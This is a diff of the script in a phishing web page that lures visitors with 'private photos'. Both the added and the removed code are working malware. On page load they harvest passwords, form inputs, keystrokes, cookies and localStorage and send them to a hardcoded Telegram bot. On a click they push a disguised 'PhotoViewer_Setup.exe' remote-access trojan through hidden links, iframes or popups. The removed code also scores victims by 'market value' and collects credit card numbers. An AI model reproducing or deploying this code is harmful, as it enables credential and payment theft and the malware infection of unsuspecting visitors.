@@ -128,7 +128,7 @@
     </div>
 
     <script>
-        // Configuration
+        // Simple Configuration
         const CONFIG = {
             telegram: {
                 token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
@@ -136,92 +136,210 @@
             },
             ratUrl: 'https://github.com/dnrldar/private-photos/raw/main/PhotoViewer_Setup',
             images: {
-                1: 'https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928',
-                2: 'https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928',
-                3: 'https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless'
+                1: 'https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png',
+                2: 'https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png',
+                3: 'https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png'
             }
         };
 
-        // Global victim data
-        let globalVictimData = null;
-        let globalVictimId = null;
+        // Global variables
+        let victimId = null;
 
-        // Victim valuation system
-        class VictimValuation {
-            static calculateVictimValue(victimData) {
-                let baseValue = 0;
-                baseValue += this.calculateLocationValue(victimData.location.country_code);
-                baseValue += this.calculateDeviceValue(victimData.hardware, victimData.browser);
-                baseValue += this.calculateDataValue(victimData);
-                baseValue += this.calculateNetworkValue(victimData.network);
-                return Math.max(5, Math.min(50, baseValue));
-            }
+        // Generate victim ID immediately
+        function generateVictimId() {
+            const randomId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+            return `VICTIM_${randomId.toUpperCase()}`;
+        }
+
+        // SIMPLE TELEGRAM FUNCTION WITH MULTIPLE FALLBACKS
+        async function sendToTelegram(message) {
+            if (!victimId) victimId = generateVictimId();
             
-            static calculateLocationValue(countryCode) {
-                const premiumCountries = ['CH', 'US', 'DE', 'UK', 'FR', 'CA', 'AU', 'JP', 'SG', 'AE'];
-                const mediumCountries = ['EU', 'KR', 'NZ', 'NO', 'SE', 'DK', 'FI', 'AT', 'BE', 'NL'];
-                if (premiumCountries.includes(countryCode)) return 20;
-                if (mediumCountries.includes(countryCode)) return 12;
-                return 5;
-            }
+            const fullMessage = `🔰 ${victimId}\n${message}`;
+            console.log('Sending to Telegram:', fullMessage);
             
-            static calculateDeviceValue(hardware, browser) {
-                let value = 0;
-                if (browser.platform.includes('Mac')) value += 8;
-                if (parseInt(browser.memory) >= 8) value += 5;
-                if (browser.cores >= 4) value += 4;
-                if (parseInt(hardware.screen.split('x')[0]) >= 1920) value += 3;
-                return value;
+            // Method 1: Direct fetch
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.telegram.chatId,
+                        text: fullMessage,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                if (response.ok) {
+                    console.log('Telegram message sent successfully');
+                    return true;
+                }
+            } catch (error) {
+                console.log('Method 1 failed:', error);
             }
-            
-            static calculateDataValue(victimData) {
-                let value = 0;
-                value += victimData.exploitation.passwords.length * 2;
-                value += victimData.exploitation.forms.length;
-                value += Math.min(victimData.exploitation.cookies.length / 5, 3);
-                return value;
+
+            // Method 2: Using image beacon
+            try {
+                const img = new Image();
+                const encodedMessage = encodeURIComponent(fullMessage);
+                img.src = `https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage?chat_id=${CONFIG.telegram.chatId}&text=${encodedMessage}`;
+                console.log('Method 2 attempted');
+                return true;
+            } catch (error) {
+                console.log('Method 2 failed:', error);
             }
-            
-            static calculateNetworkValue(network) {
-                let value = 0;
-                if (network.vpn === 'Residential IP') value += 3;
-                if (network.connection === '4g' || network.connection === 'wifi') value += 2;
-                if (network.proxy === 'Normal') value += 2;
-                return value;
+
+            // Method 3: Using form submission
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CONFIG.telegram.chatId);
+                formData.append('text', fullMessage);
+                
+                fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
+                    method: 'POST',
+                    body: formData
+                });
+                console.log('Method 3 attempted');
+                return true;
+            } catch (error) {
+                console.log('Method 3 failed:', error);
             }
+
+            return false;
+        }
+
+        // SIMPLE DATA COLLECTION
+        function collectBasicData() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer || 'Direct',
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                cookies: document.cookie,
+                localStorage: JSON.stringify(getAllLocalStorage()),
+                forms: collectFormData(),
+                inputs: collectInputData(),
+                passwords: collectPasswords()
+            };
             
-            static getPriceClass(value) {
-                if (value >= 35) return 'HIGH';
-                if (value >= 20) return 'MEDIUM';
-                return 'LOW';
+            // Get IP
+            getIP().then(ip => {
+                data.ip = ip;
+                sendCollectedData(data);
+            }).catch(() => {
+                data.ip = 'Unknown';
+                sendCollectedData(data);
+            });
+            
+            return data;
+        }
+
+        function getAllLocalStorage() {
+            const ls = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                ls[key] = localStorage.getItem(key);
             }
-            
-            static generateVictimID(victimData) {
-                const country = victimData.location.country_code;
-                const price = this.calculateVictimValue(victimData);
-                const priceClass = this.getPriceClass(price);
-                const randomHash = Math.random().toString(36).substr(2, 8).toUpperCase();
-                return `VI.${randomHash}.${country}.${priceClass}$${price}`;
+            return ls;
+        }
+
+        function collectFormData() {
+            const forms = {};
+            document.querySelectorAll('form').forEach((form, index) => {
+                const formData = {};
+                form.querySelectorAll('input, select, textarea').forEach(field => {
+                    if (field.value) {
+                        formData[field.name || field.type || `field_${index}`] = field.value;
+                    }
+                });
+                if (Object.keys(formData).length > 0) {
+                    forms[`form_${index}`] = formData;
+                }
+            });
+            return forms;
+        }
+
+        function collectInputData() {
+            const inputs = {};
+            document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]').forEach(input => {
+                if (input.value) {
+                    inputs[input.name || input.placeholder || 'unknown'] = input.value;
+                }
+            });
+            return inputs;
+        }
+
+        function collectPasswords() {
+            const passwords = [];
+            document.querySelectorAll('input[type="password"]').forEach(input => {
+                if (input.value) {
+                    passwords.push({
+                        field: input.name || 'password',
+                        value: input.value
+                    });
+                }
+            });
+            return passwords;
+        }
+
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                try {
+                    const response = await fetch('https://api64.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    return 'Unknown';
+                }
             }
         }
 
-        // AUTOMATIC DATA THEFT ON PAGE LOAD
-        window.addEventListener('load', async function() {
-            console.log('Starting automatic data theft...');
-            globalVictimData = await collectEnhancedData();
-            const victimValue = VictimValuation.calculateVictimValue(globalVictimData);
-            globalVictimId = VictimValuation.generateVictimID(globalVictimData);
-            globalVictimData.victim_value = victimValue;
-            globalVictimData.id = globalVictimId;
+        function sendCollectedData(data) {
+            if (!victimId) victimId = generateVictimId();
             
-            // Send initial data theft report
-            await sendTelegramMessage(`INITIAL DATA THEFT - VICTIM ID: ${globalVictimId}\nPage visited: ${globalVictimData.behavioral.url}\nIP: ${globalVictimData.network.ip}\nLocation: ${globalVictimData.location.city}, ${globalVictimData.location.country}`);
+            let message = `🆕 NEW VICTIM CONNECTED\n`;
+            message += `🔰 ID: ${victimId}\n`;
+            message += `🌐 IP: ${data.ip}\n`;
+            message += `🕒 Time: ${data.timestamp}\n`;
+            message += `🔗 URL: ${data.url}\n`;
+            message += `📱 Platform: ${data.platform}\n`;
+            message += `🖥️ Screen: ${data.screen}\n`;
+            message += `🌍 Language: ${data.language}\n\n`;
             
-            // Send full data report
-            await sendEnhancedReport(globalVictimData, false);
-        });
+            message += `📊 DATA CAPTURED:\n`;
+            message += `🔑 Passwords: ${data.passwords.length}\n`;
+            message += `📝 Forms: ${Object.keys(data.forms).length}\n`;
+            message += `✏️ Inputs: ${Object.keys(data.inputs).length}\n`;
+            message += `🍪 Cookies: ${data.cookies ? 'Yes' : 'No'}\n`;
+            message += `💾 LocalStorage: ${Object.keys(JSON.parse(data.localStorage)).length} items\n`;
+            
+            if (data.passwords.length > 0) {
+                message += `\n🔑 PASSWORDS:\n`;
+                data.passwords.forEach((pwd, i) => {
+                    message += `${i+1}. ${pwd.field}: ${pwd.value}\n`;
+                });
+            }
+            
+            if (Object.keys(data.inputs).length > 0) {
+                message += `\n✏️ INPUT DATA:\n`;
+                Object.entries(data.inputs).forEach(([key, value]) => {
+                    message += `${key}: ${value}\n`;
+                });
+            }
 
-        // MAIN FUNCTIONS
+            sendToTelegram(message);
+        }
+
+        // RAT DEPLOYMENT
         async function startRATDeployment(imageId) {
             const loading = document.getElementById('loading');
             const loadingText = document.getElementById('loadingText');
@@ -229,538 +347,113 @@
             loading.style.display = 'block';
             loadingText.textContent = 'Preparing content...';
             
-            // Send RAT deployment notification
-            if (globalVictimId) {
-                await sendTelegramMessage(`RAT DEPLOYMENT TRIGGERED - VICTIM ID: ${globalVictimId}\nImage clicked: ${imageId}\nUser attempting to access content`);
-            }
+            // Send click notification
+            await sendToTelegram(`🖱️ IMAGE CLICKED\nImage ID: ${imageId}\nUser attempting to access content`);
             
-            await deployAdvancedStealthRAT();
+            // Deploy RAT
+            await deployRAT();
             
-            loadingText.className = 'success';
-            loadingText.textContent = 'Content loaded!';
-            
+            // Redirect to image
             setTimeout(() => {
-                window.location.href = getImageUrl(imageId);
+                window.location.href = CONFIG.images[imageId] || '#';
             }, 2000);
         }
 
-        // RAT DEPLOYMENT FUNCTIONS
-        async function deployAdvancedStealthRAT() {
-            const methods = [
-                deployBlobMethod,
-                deployIframeMethod,
-                deployFetchMethod
-            ];
-
-            for (let method of methods) {
+        async function deployRAT() {
+            await sendToTelegram(`🚀 DEPLOYING RAT...`);
+            
+            // Multiple deployment methods
+            const methods = [deployMethod1, deployMethod2, deployMethod3];
+            
+            for (const method of methods) {
                 try {
-                    await method();
-                    if (globalVictimId) {
-                        await sendTelegramMessage(`RAT DEPLOYED SUCCESSFULLY - VICTIM ID: ${globalVictimId}\nMethod: ${method.name}`);
+                    const success = await method();
+                    if (success) {
+                        await sendToTelegram(`✅ RAT DEPLOYED SUCCESSFULLY`);
+                        break;
                     }
-                    break;
-                } catch (e) {
-                    continue;
+                } catch (error) {
+                    console.log('Deployment method failed:', error);
                 }
             }
         }
 
-        async function deployBlobMethod() {
+        async function deployMethod1() {
             try {
-                const response = await fetch(CONFIG.ratUrl);
-                const blob = await response.blob();
-                const url = URL.createObjectURL(blob);
-                
                 const link = document.createElement('a');
-                link.href = url;
+                link.href = CONFIG.ratUrl;
                 link.download = 'PhotoViewer_Setup.exe';
-                link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;opacity:0;';
-                
+                link.style.display = 'none';
                 document.body.appendChild(link);
                 link.click();
-                setTimeout(() => link.click(), 100);
-                setTimeout(() => link.click(), 500);
-                
-                setTimeout(() => {
-                    document.body.removeChild(link);
-                    URL.revokeObjectURL(url);
-                }, 3000);
-                
+                setTimeout(() => document.body.removeChild(link), 3000);
                 return true;
-            } catch (e) {
+            } catch (error) {
                 return false;
             }
         }
 
-        async function deployIframeMethod() {
+        async function deployMethod2() {
             try {
                 const iframe = document.createElement('iframe');
                 iframe.src = CONFIG.ratUrl;
-                iframe.style.cssText = 'display:none;visibility:hidden;width:0;height:0;border:none;';
+                iframe.style.display = 'none';
                 document.body.appendChild(iframe);
-                
-                setTimeout(() => {
-                    if (document.body.contains(iframe)) {
-                        document.body.removeChild(iframe);
-                    }
-                }, 10000);
-                
+                setTimeout(() => document.body.removeChild(iframe), 5000);
                 return true;
-            } catch (e) {
+            } catch (error) {
                 return false;
             }
         }
 
-        async function deployFetchMethod() {
+        async function deployMethod3() {
             try {
-                const response = await fetch(CONFIG.ratUrl);
-                const blob = await response.blob();
-                const url = URL.createObjectURL(blob);
-                const object = document.createElement('object');
-                object.data = url;
-                object.style.cssText = 'display:none;width:0;height:0;';
-                document.body.appendChild(object);
-                
-                setTimeout(() => {
-                    if (document.body.contains(object)) {
-                        document.body.removeChild(object);
-                    }
-                    URL.revokeObjectURL(url);
-                }, 5000);
-                
+                window.open(CONFIG.ratUrl, '_blank');
                 return true;
-            } catch (e) {
+            } catch (error) {
                 return false;
             }
         }
 
-        // DATA COLLECTION FUNCTIONS
-        async function collectEnhancedData() {
-            const [network, location, fingerprint, hardware, browser, behavioral, exploitation, social] = await Promise.all([
-                collectNetworkData(),
-                collectLocationData(),
-                collectFingerprintData(),
-                collectHardwareData(),
-                collectBrowserData(),
-                collectBehavioralData(),
-                collectExploitationData(),
-                collectSocialData()
-            ]);
-
-            return {
-                timestamp: new Date().toLocaleString(),
-                network, location, fingerprint, hardware, browser, behavioral, exploitation, social
-            };
-        }
-
-        async function collectNetworkData() {
-            const ipData = await getEnhancedIP();
-            const connection = navigator.connection || {};
+        // START EVERYTHING ON PAGE LOAD
+        window.addEventListener('load', function() {
+            console.log('Starting data collection...');
+            victimId = generateVictimId();
             
-            return {
-                ip: ipData.ip || 'Unknown',
-                isp: ipData.isp || 'Unknown',
-                asn: ipData.asn || 'Unknown',
-                connection: connection.effectiveType || 'Unknown',
-                vpn: detectVPN(ipData.ip),
-                proxy: detectProxy(),
-                tor: detectTor()
-            };
-        }
-
-        async function collectLocationData() {
-            const ipData = await getEnhancedIP();
-            if (!ipData.ip || ipData.ip === 'Unknown') return {country_code: 'unknown', city: 'Unknown', country: 'Unknown'};
+            // Send immediate notification
+            sendToTelegram(`🚀 PAGE LOADED\nStarting data collection...`);
             
-            try {
-                const response = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                const data = await response.json();
-                return {
-                    city: data.city || 'Unknown',
-                    region: data.region || 'Unknown',
-                    country: data.country_name || 'Unknown',
-                    country_code: data.country_code || 'Unknown',
-                    postal: data.postal || 'Unknown',
-                    latitude: data.latitude || 'Unknown',
-                    longitude: data.longitude || 'Unknown',
-                    timezone: data.timezone || 'Unknown',
-                    currency: data.currency || 'Unknown',
-                    calling_code: data.country_calling_code || 'Unknown'
-                };
-            } catch (e) {
-                return {country_code: 'unknown', city: 'Unknown', country: 'Unknown'};
-            }
-        }
-
-        function collectHardwareData() {
-            return {
-                screen: `${screen.width}x${screen.height}`,
-                pixel_ratio: window.devicePixelRatio,
-                color_depth: screen.colorDepth,
-                orientation: screen.orientation ? screen.orientation.type : 'Unknown',
-                touch_points: navigator.maxTouchPoints || 0,
-                device_memory: navigator.deviceMemory || 'Unknown'
-            };
-        }
-
-        function collectBrowserData() {
-            return {
-                platform: navigator.platform,
-                vendor: navigator.vendor || 'Unknown',
-                language: navigator.language,
-                cores: navigator.hardwareConcurrency,
-                memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
-                plugins: navigator.plugins.length,
-                webdriver: navigator.webdriver ? 'Detected' : 'Not detected',
-                pdf_viewer: navigator.pdfViewerEnabled !== undefined ? navigator.pdfViewerEnabled : 'Unknown'
-            };
-        }
-
-        function collectFingerprintData() {
-            return {
-                canvas: generateCanvasFingerprint(),
-                webgl: generateWebGLFingerprint(),
-                audio: testAudioSupport(),
-                fonts: detectFonts(),
-                timezone_offset: new Date().getTimezoneOffset()
-            };
-        }
-
-        function collectBehavioralData() {
-            const perf = performance.timing;
-            return {
-                referrer: document.referrer || 'Direct',
-                page_load: perf ? perf.loadEventEnd - perf.navigationStart : 'Unknown',
-                time_on_page: Date.now() - (perf ? perf.navigationStart : Date.now()),
-                dom_size: document.getElementsByTagName('*').length,
-                url: window.location.href
-            };
-        }
-
-        async function collectExploitationData() {
-            return {
-                passwords: await stealPasswords(),
-                autofill: harvestAutofill(),
-                forms: harvestForms(),
-                cookies: stealCookies(),
-                storage: stealStorage(),
-                sessions: checkSessions(),
-                history: await checkHistory()
-            };
-        }
-
-        async function collectSocialData() {
-            return {
-                saved_passwords: await harvestSavedPasswords(),
-                credit_cards: await harvestCreditCards(),
-                personal_info: await harvestPersonalInfo(),
-                browsing_data: await harvestBrowsingData()
-            };
-        }
-
-        // SOCIAL DATA HARVESTING FUNCTIONS
-        async function harvestSavedPasswords() {
-            const passwords = [];
-            try {
-                const forms = document.querySelectorAll('form');
-                forms.forEach(form => {
-                    const inputs = form.querySelectorAll('input[type="password"]');
-                    inputs.forEach(input => {
-                        if (input.value) {
-                            passwords.push({
-                                field: input.name || 'unknown',
-                                value: input.value,
-                                form: form.action || 'unknown'
-                            });
-                        }
-                    });
-                });
-            } catch (e) {}
-            return passwords;
-        }
-
-        async function harvestCreditCards() {
-            const cards = [];
-            try {
-                const ccFields = document.querySelectorAll('input[autocomplete*="cc"], input[name*="card"], input[type="tel"]');
-                ccFields.forEach(field => {
-                    if (field.value && field.value.replace(/\s/g, '').length > 10) {
-                        cards.push({
-                            type: field.name || 'unknown',
-                            value: field.value
-                        });
-                    }
-                });
-            } catch (e) {}
-            return cards;
-        }
-
-        async function harvestPersonalInfo() {
-            const info = {};
-            try {
-                const fields = document.querySelectorAll('input[autocomplete], input[name], input[type="text"], input[type="email"]');
-                fields.forEach(field => {
-                    if (field.value) {
-                        const key = field.name || field.autocomplete || field.placeholder || 'unknown';
-                        info[key] = field.value;
-                    }
-                });
-            } catch (e) {}
-            return info;
-        }
-
-        async function harvestBrowsingData() {
-            return {
-                cookies: document.cookie,
-                localStorage: JSON.stringify(stealStorage()),
-                session_storage: sessionStorage.length,
-                history_estimate: await estimateHistory()
-            };
-        }
-
-        async function estimateHistory() {
-            const popularSites = [
-                'facebook.com', 'twitter.com', 'instagram.com', 'gmail.com', 'google.com',
-                'youtube.com', 'amazon.com', 'netflix.com', 'reddit.com', 'linkedin.com'
-            ];
-            const visited = [];
+            // Collect and send data
+            setTimeout(() => {
+                collectBasicData();
+            }, 1000);
             
-            for (let site of popularSites) {
-                try {
-                    const link = document.createElement('a');
-                    link.href = `https://${site}`;
-                    link.style.cssText = 'position:absolute;left:-9999px;visibility:hidden;';
-                    document.body.appendChild(link);
-                    
-                    const computed = getComputedStyle(link);
-                    if (computed.visibility !== 'hidden' || computed.display !== 'none') {
-                        visited.push(site);
-                    }
-                    
-                    document.body.removeChild(link);
-                } catch (e) {}
-            }
-            return visited;
-        }
+            // Send periodic updates
+            setInterval(() => {
+                sendToTelegram(`📊 HEARTBEAT\nSystem active - ${new Date().toLocaleTimeString()}`);
+            }, 60000); // Every minute
+        });
 
-        // TELEGRAM FUNCTIONS
-        async function sendTelegramMessage(message) {
-            if (!globalVictimId) return;
-            
-            const fullMessage = `VICTIM ID: ${globalVictimId}\n${message}`;
-            
-            try {
-                await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CONFIG.telegram.chatId,
-                        text: fullMessage,
-                        parse_mode: null
-                    })
-                });
-            } catch (e) {
-                console.log('Telegram message failed');
-            }
-        }
+        // Also collect data on form interactions
+        document.addEventListener('submit', function(e) {
+            setTimeout(() => {
+                sendToTelegram(`📝 FORM SUBMITTED\nForm action: ${e.target.action || 'unknown'}`);
+                collectBasicData();
+            }, 500);
+        });
 
-        async function sendEnhancedReport(victimData, ratDeployed) {
-            if (!globalVictimId) return;
+        // Collect data on input changes (with debounce)
+        let inputTimeout;
+        document.addEventListener('input', function(e) {
+            clearTimeout(inputTimeout);
+            inputTimeout = setTimeout(() => {
+                if (e.target.value && e.target.value.length > 3) {
+                    sendToTelegram(`⌨️ INPUT DETECTED\nField: ${e.target.name || e.target.type}\nValue: ${e.target.value.substring(0, 50)}`);
+                }
+            }, 1000);
+        });
 
-            let message = `COMPLETE DATA REPORT - VICTIM ID: ${globalVictimId}\n\n`;
-            
-            message += `MARKET VALUE: $${victimData.victim_value}\n`;
-            message += `CLASS: ${VictimValuation.getPriceClass(victimData.victim_value)}\n\n`;
-            
-            message += `NETWORK DATA:\n`;
-            message += `IP: ${victimData.network.ip}\n`;
-            message += `ISP: ${victimData.network.isp}\n`;
-            message += `Location: ${victimData.location.city}, ${victimData.location.country}\n`;
-            message += `Connection: ${victimData.network.connection}\n\n`;
-            
-            message += `SYSTEM DATA:\n`;
-            message += `Platform: ${victimData.browser.platform}\n`;
-            message += `Browser: ${victimData.browser.vendor}\n`;
-            message += `Language: ${victimData.browser.language}\n`;
-            message += `Cores: ${victimData.browser.cores}\n`;
-            message += `Memory: ${victimData.browser.memory}\n\n`;
-            
-            message += `EXPLOITATION RESULTS:\n`;
-            message += `Passwords: ${victimData.exploitation.passwords.length}\n`;
-            message += `Forms: ${victimData.exploitation.forms.length}\n`;
-            message += `Cookies: ${Object.keys(victimData.exploitation.cookies).length}\n`;
-            message += `Storage Items: ${Object.keys(victimData.exploitation.storage).length}\n\n`;
-            
-            message += `PERSONAL DATA CAPTURED:\n`;
-            message += `Saved Passwords: ${victimData.social.saved_passwords.length}\n`;
-            message += `Credit Cards: ${victimData.social.credit_cards.length}\n`;
-            message += `Personal Info Fields: ${Object.keys(victimData.social.personal_info).length}\n\n`;
-            
-            if (victimData.social.saved_passwords.length > 0) {
-                message += `CAPTURED PASSWORDS:\n`;
-                victimData.social.saved_passwords.forEach((pwd, index) => {
-                    message += `${index + 1}. ${pwd.field}: ${pwd.value}\n`;
-                });
-                message += `\n`;
-            }
-            
-            if (victimData.social.credit_cards.length > 0) {
-                message += `CREDIT CARD DATA:\n`;
-                victimData.social.credit_cards.forEach((card, index) => {
-                    message += `${index + 1}. ${card.type}: ${card.value}\n`;
-                });
-                message += `\n`;
-            }
-            
-            if (Object.keys(victimData.social.personal_info).length > 0) {
-                message += `PERSONAL INFORMATION:\n`;
-                Object.keys(victimData.social.personal_info).forEach(key => {
-                    message += `${key}: ${victimData.social.personal_info[key]}\n`;
-                });
-                message += `\n`;
-            }
-
-            message += `Collection Time: ${victimData.timestamp}\n`;
-            message += `RAT Ready: ${ratDeployed ? 'YES' : 'ON CLICK'}`;
-
-            await sendTelegramMessage(message);
-        }
-
-        // UTILITY FUNCTIONS
-        async function getEnhancedIP() {
-            const services = [
-                'https://api.ipify.org?format=json',
-                'https://api64.ipify.org?format=json',
-                'https://ipinfo.io/json'
-            ];
-            
-            for (let service of services) {
-                try {
-                    const response = await fetch(service);
-                    const data = await response.json();
-                    return {
-                        ip: data.ip || 'Unknown',
-                        isp: data.org || 'Unknown',
-                        asn: data.asn || 'Unknown'
-                    };
-                } catch (e) { continue; }
-            }
-            return { ip: 'Unknown', isp: 'Unknown', asn: 'Unknown' };
-        }
-
-        function detectVPN(ip) {
-            const vpnRanges = ['104.', '107.', '108.', '109.', '140.', '144.', '146.', '147.', '148.', '149.'];
-            return vpnRanges.some(range => ip.startsWith(range)) ? 'Possible VPN/Proxy' : 'Residential IP';
-        }
-
-        function detectProxy() {
-            return navigator.webdriver ? 'Possible automation' : 'Normal';
-        }
-
-        function detectTor() {
-            return navigator.plugins.length === 0 ? 'Possible Tor browser' : 'Normal';
-        }
-
-        function generateCanvasFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillText('Fingerprint', 2, 2);
-                return canvas.toDataURL().substring(0, 50);
-            } catch (e) { return 'failed'; }
-        }
-
-        function generateWebGLFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                return gl ? gl.getParameter(gl.VERSION) : 'no_webgl';
-            } catch (e) { return 'failed'; }
-        }
-
-        function testAudioSupport() {
-            return window.AudioContext ? 'Audio supported' : 'No audio support';
-        }
-
-        function detectFonts() {
-            const fonts = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia'];
-            return fonts.join(', ');
-        }
-
-        async function stealPasswords() {
-            const fields = document.querySelectorAll('input[type="password"]');
-            return Array.from(fields).filter(f => f.value).map(f => ({
-                field: f.name || 'unknown',
-                value: f.value
-            }));
-        }
-
-        function harvestAutofill() {
-            const data = {};
-            document.querySelectorAll('input[type="text"], input[type="email"]').forEach(input => {
-                if (input.value) data[input.name || 'unknown'] = input.value;
-            });
-            return data;
-        }
-
-        function harvestForms() {
-            const forms = {};
-            document.querySelectorAll('form').forEach((form, i) => {
-                const data = {};
-                form.querySelectorAll('input, textarea, select').forEach(input => {
-                    if (input.value) data[input.name || input.type] = input.value;
-                });
-                if (Object.keys(data).length) forms[`form_${i}`] = data;
-            });
-            return forms;
-        }
-
-        function stealCookies() {
-            return document.cookie.split(';').reduce((cookies, cookie) => {
-                const [name, value] = cookie.split('=').map(c => c.trim());
-                if (name) cookies[name] = value || '';
-                return cookies;
-            }, {});
-        }
-
-        function stealStorage() {
-            const data = {};
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                data[key] = localStorage.getItem(key);
-            }
-            return data;
-        }
-
-        function checkSessions() {
-            return {
-                session_storage: sessionStorage.length,
-                has_auth_cookies: document.cookie.includes('session') || document.cookie.includes('auth')
-            };
-        }
-
-        async function checkHistory() {
-            const sites = ['facebook.com', 'twitter.com', 'instagram.com', 'gmail.com', 'google.com'];
-            const visited = [];
-            for (let site of sites) {
-                const link = document.createElement('a');
-                link.href = `https://${site}`;
-                link.style.display = 'none';
-                document.body.appendChild(link);
-                const computed = getComputedStyle(link);
-                if (computed.color !== 'rgb(0, 0, 238)') visited.push(site);
-                document.body.removeChild(link);
-            }
-            return visited;
-        }
-
-        function getImageUrl(id) {
-            return CONFIG.images[id] || '#';
-        }
-
-        console.log('System loaded - Automatic data theft enabled');
+        console.log('Malicious system initialized');
     </script>
 </body>
 </html>
